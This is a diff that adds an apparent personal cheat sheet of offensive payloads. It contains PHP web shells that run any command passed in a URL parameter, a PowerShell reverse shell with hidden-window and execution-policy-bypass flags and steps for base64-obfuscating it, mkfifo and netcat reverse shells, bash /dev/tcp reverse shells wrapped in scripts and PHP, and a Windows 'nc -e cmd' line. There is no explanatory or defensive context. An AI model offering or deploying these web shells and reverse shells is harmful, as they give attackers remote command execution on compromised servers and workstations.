@@ -1,0 +1,45 @@
+PHP CMD one line :
+
+<?php system($_GET['cmd']); ?>
+
+PHP code:
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+</html>
+
+POWERSHELL:
+powershell -w hidden -exec bypass -nop -enc 
+powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+OBFUSCATION: iconv -f ASCII -t UTF-16LE   PowershellPAyload.txt | base64 | tr -d "\n" After this, encode to URL if  you want to paste it into url.
+
+Mkfifo:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip 1234 >/tmp/f
+Php mkfifo:
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip 1234 >/tmp/f") ?>
+
+BASH:
+bash -c /bin/bash -i >& /dev/tcp/ip/port 0>&1
+To the file:
+echo "bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'" >> bash.sh
+php:
+<?php exec("/bin/bash -c 'bash -i > /dev/tcp/ip/port 0>&1'");
+
+NC:
+Win:  nc ip port -e cmd  
+
+
+
+
